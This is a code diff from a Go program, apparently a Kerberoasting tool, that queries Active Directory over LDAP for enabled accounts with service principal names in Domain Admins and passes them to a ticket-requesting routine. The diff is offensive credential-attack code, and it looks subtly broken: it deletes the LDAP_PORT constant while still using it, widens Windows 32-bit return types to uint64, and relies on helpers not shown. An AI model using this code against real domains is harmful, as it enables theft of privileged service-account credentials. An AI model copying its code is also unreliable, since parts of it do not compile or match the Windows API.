@@ -6,25 +6,27 @@ import (
 	_ "embed"
 	"encoding/hex"
 	"fmt"
-	"log"
 	"math"
 	"regexp"
 	"strconv"
-	"syscall"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
 )
 
-//sys ldap_initW(hostName string, portNumber uint32) (ld uintptr, err error) = Wldap32.ldap_initA
-//sys ldap_bind_sW(ld uintptr, dn *uint8, cred *uint8, method uint32) (ret uint32) = Wldap32.ldap_bind_sA
-//sys ldap_search_sA(ld uintptr, base *uint8, scope uint32, filter *uint8,  attrs **uint8, attrsonly uint32, res *uintptr) (ret uint32) = Wldap32.ldap_search_sA
-//sys ldap_count_entries(ld uintptr, res uintptr) (ret uint32) = Wldap32.ldap_count_entries
+//sys ldap_initW(hostName string, portNumber uint64) (ld uintptr,err error) = Wldap32.ldap_initA
+//sys ldap_bind_sW(ld uintptr, dn *uint8, cred *uint8, method uint64) (ret uint64) = Wldap32.ldap_bind_sA
+//sys ldap_search_sA(ld uintptr, base *uint8, scope uint64, filter *uint8,  attrs **uint8, attrsonly uint64, res *uintptr) (ret uint64) = Wldap32.ldap_search_sA
+//sys ldap_count_entries(ld uintptr, res uintptr) (ret uint64) = Wldap32.ldap_count_entries
 //sys ldap_get_valuesA(ld uintptr, entry uintptr, attr *uint8) (ret **uint8) = Wldap32.ldap_get_valuesA
 //sys ldap_first_entry(ld uintptr, res uintptr) (ret uintptr) = Wldap32.ldap_first_entry
 //sys ldap_next_entry(ld uintptr, res uintptr) (ret uintptr) = Wldap32.ldap_next_entry
-//sys ldap_value_free(vals **uint8) (ret uint32) = Wldap32.ldap_value_free
-//sys ldap_unbind_s(ld uintptr) (ret uint32) = Wldap32.ldap_unbind_s
+//sys ldap_value_free(vals **uint8) (ret uint64) = Wldap32.ldap_value_free
+//sys ldap_unbind_s(ld uintptr) (ret uint64) = Wldap32.ldap_unbind_s
+//sys ldap_first_attribute(ld uintptr, entry uintptr, ber *uintptr) (ret *uint8) = Wldap32.ldap_first_attribute
+//sys ldap_next_attribute(ld uintptr, entry uintptr, ber uintptr) (ret *uint8) = Wldap32.ldap_next_attribute
+//sys ldap_count_valuesA(vals **uint8) (ret uint64) = Wldap32.ldap_count_values
+//sys ldap_memfree(block *uint8) = Wldap32.ldap_memfree
 
 //sys LsaConnectUntrusted(lsaHandle *uintptr) (ret uint32) = Secur32.LsaConnectUntrusted
 //sys LsaDeregisterLogonProcess(lsaHandle uintptr) (ret uint32) = Secur32.LsaDeregisterLogonProcess
@@ -33,41 +35,13 @@ import (
 
 //sys GetComputerNameExA(nametype uint32, buf unsafe.Pointer, n *uint32) (err error) = Kernel32.GetComputerNameExA
 
-//http://www.wisdomsoft.jp/421.html
-//https://qiita.com/t-yama-3/items/724f5f76356b814b0b2d
-type (
-	DWORD    uint32
-	DWORD64  uint64
-	LPVOID   uintptr
-	LPDWORD  *uint32
-	LPCSTR   *int8
-	LPCWSTR  *int16
-	LPSTR    *int16
-	HANDLE   uintptr
-	PHANDLE  *uintptr
-	BYTE     byte
-	ULONG    uint32
-	PSTR     *uint8
-	PZPSTR   **uint8
-	PWSTR    *uint16
-	SHORT    int16
-	PCHAR    *uint8
-	PUCHAR   *uint8
-	CHAR     uint8
-	NTSTATUS uint32
-)
+type LdapServer struct {
+	host string
+	port uint64
+}
 
 const (
-	LDAP_PORT           uint32 = 389
-	LDAP_AUTH_OTHERKIND uint32 = 0x86
-	LDAP_AUTH_NEGOTIATE uint32 = (LDAP_AUTH_OTHERKIND | 0x0400)
-	LDAP_SUCCESS        uint32 = 0
-	LDAP_SCOPE_BASE     uint32 = 0x00
-	LDAP_SCOPE_ONELEVEL uint32 = 0x01
-	LDAP_SCOPE_SUBTREE  uint32 = 0x02
-)
-
-const (
+	UF_ACCOUNT_DISABLE                  uint64 = 2
 	STATUS_SUCCESS                      uint32 = uint32(windows.STATUS_SUCCESS)
 	STATUS_ACCESS_DENIED                uint32 = uint32(windows.STATUS_ACCESS_DENIED)
 	DEFAULT_AUTH_PKG_ID                 uint32 = math.MaxUint32
@@ -154,22 +128,6 @@ func kerbExternalNameFromPtr(ptr uintptr) KERB_EXTERNAL_NAME {
 		ret.names = append(ret.names, name)
 	}
 	return ret
-}
-
-//Max 1000byte /without error handling
-func ldap_get_values(ld uintptr, entry uintptr, attr string) string {
-	attrPtr, _ := syscall.BytePtrFromString(attr)
-	val := ldap_get_valuesA(ld, entry, attrPtr)
-	var resByte []byte
-	for i := 0; i < 1000; i++ {
-		tmp := (*uint8)(unsafe.Add(unsafe.Pointer(*val), i))
-		if *tmp == 0 {
-			break
-		}
-		resByte = append(resByte, *tmp)
-	}
-	ldap_value_free(val)
-	return string(resByte)
 }
 
 func getDomainSPNTicket(user User) {
@@ -268,48 +226,30 @@ func kerberoast() []User {
 	hostNameByte := make([]uint8, bufSize)
 	GetComputerNameExA(nameType, unsafe.Pointer(&hostNameByte[0]), &bufSize)
 	hostName := string(hostNameByte[:len(hostNameByte)-1])
-
-	ld, _ := ldap_initW(hostName, LDAP_PORT)
-	iRtn := ldap_bind_sW(ld, nil, nil, LDAP_AUTH_NEGOTIATE)
-	if iRtn != LDAP_SUCCESS {
-		fmt.Println(iRtn)
-		log.Fatalln("Bind error")
-	}
-	var res uintptr
-
-	ldapStatus := ldap_search_sA(ld, nil, LDAP_SCOPE_BASE, nil, nil, 0, &res)
-	if ldapStatus != LDAP_SUCCESS {
-		log.Fatalln("ldap_search_sA error")
-	}
-
-	numEntries := ldap_count_entries(ld, res)
-	domainDN := ldap_get_values(ld, res, "defaultNamingContext")
-	base, err := syscall.BytePtrFromString(domainDN)
-	if err != nil {
-		panic(err)
-	}
-	filter, err := syscall.BytePtrFromString("(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))")
-	if err != nil {
-		panic(err)
-	}
-
-	ldapStatus = ldap_search_sA(ld, base, LDAP_SCOPE_SUBTREE, filter, nil, 0, &res)
-	if ldapStatus != LDAP_SUCCESS {
-		log.Fatalln("ldap_search_sA error")
-	}
-
-	numEntries = ldap_count_entries(ld, res)
-	entry := ldap_first_entry(ld, res)
-
+	ls := LdapServer{hostName, LDAP_PORT}
+	baseDN := ls.ldapGetBase()
+	// filter := "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))"
+	filter := fmt.Sprintf("("+
+		"&(samAccountType=805306368)"+ //all user objects
+		"(servicePrincipalName=*)"+ //SPN
+		"(!(samAccountName=krbtgt))"+ //without krbtgt
+		"(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))"+ //without disabled accounts
+		"(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,%s)"+ //member of Domain Admins
+		")", UF_ACCOUNT_DISABLE, baseDN)
+	res := ls.ldapSearch(filter, baseDN)
 	var users []User
-	for i := 0; i < int(numEntries); i++ {
-		samAccountName := ldap_get_values(ld, entry, "samAccountName")
-		distinguishedName := ldap_get_values(ld, entry, "distinguishedName")
-		servicePrincipalName := ldap_get_values(ld, entry, "servicePrincipalName")
-		users = append(users, User{sAMAccountName: samAccountName, distinguishedName: distinguishedName, servicePrincipalName: servicePrincipalName})
-		entry = ldap_next_entry(ld, entry)
+	for _, r := range res {
+		samAccountName := r["samAccountName"][0]
+		distinguishedName := r["distinguishedName"][0]
+		user := User{
+			sAMAccountName:    samAccountName,
+			distinguishedName: distinguishedName,
+		}
+		for _, spn := range r["servicePrincipalName"] {
+			user.servicePrincipalName = spn
+			users = append(users, user)
+		}
 	}
-	ldap_unbind_s(ld)
 	return users
 }
 
